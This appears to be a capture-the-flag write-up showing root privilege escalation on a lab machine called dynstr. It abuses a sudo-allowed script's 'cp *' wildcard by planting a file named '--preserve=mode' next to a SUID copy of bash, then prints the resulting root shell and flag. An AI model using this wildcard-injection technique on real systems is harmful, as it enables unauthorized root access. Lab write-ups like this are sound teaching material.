# Enumeration-

```bash
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

Checking the script-

```bash
#!/usr/bin/bash
# This script generates named.conf.bindmgr to workaround the problem
# that  bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#not deleting them. As we generate the list of files to be included
#from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
	echo "[-] ERROR: Check versioning. Exiting."
	exit 42
fi  
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then                                                                     [0/598]
	echo "[-] ERROR: Check versioning. Exiting."
	exit 43
fi
# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF 
for file in * ; do
	printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR." 
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration." 
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
	echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
	named-checkconf $BINDMGR_CONF 2>&1 | indent
	exit 44
else 
	echo "[+] Configuration successfully staged."
	# *** TODO *** Uncomment restart once we are live.
	# systemctl restart bind9
	if [[ $? -ne 0 ]] ; then
		echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
		systemctl status bind9
	else
		echo "[+] Restart of bind9 via systemctl succeeded."
	fi
fi
```

Looking at the script we can see that we need a .version file in the current directory with a version number so let's create it.

```bash
echo "2" > .version
```

we can see from the script that we can get the privilege on the binary in the same directory so let's get /bin/bash to this directory.

```bash
cp /bin/bash .
```

Now let's give it a suid bit and preserve that mode on that binary so now when we will execute the script we will get root privileged binary in /etc/bind/named.bindmgr/

```bash
bindmgr@dynstr:~$ cd /dev/shm/
bindmgr@dynstr:/dev/shm$ echo "2" > .version
bindmgr@dynstr:/dev/shm$ cp /bin/bash .
bindmgr@dynstr:/dev/shm$ ls -la
total 1160
drwxrwxrwt  2 root    root         80 Jun 30 14:37 .
drwxr-xr-x 17 root    root       3940 Jun 30 08:58 ..
-rwxr-xr-x  1 bindmgr bindmgr 1183448 Jun 30 14:37 bash
-rw-rw-r--  1 bindmgr bindmgr       4 Jun 30 14:36 .version
bindmgr@dynstr:/dev/shm$ chmod +s bash 
bindmgr@dynstr:/dev/shm$ echo > --preserve=mode
bindmgr@dynstr:/dev/shm$ ls -la
total 1164
drwxrwxrwt  2 root    root        100 Jun 30 14:39  .
drwxr-xr-x 17 root    root       3940 Jun 30 08:58  ..
-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 30 14:37  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Jun 30 14:39 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       4 Jun 30 14:36  .version
```

Now let's execute the sudo command and get the root privileges on our bash binary-

# Root-

```bash
bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
bindmgr@dynstr:/dev/shm$ ls
 bash  '--preserve=mode'
bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p 
bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)
bash-5.0# cd /root/
bash-5.0# ls
cleanup  root.txt
bash-5.0# cat root.txt 
7b97ecdd54020c76d19ab54627bde7c7
```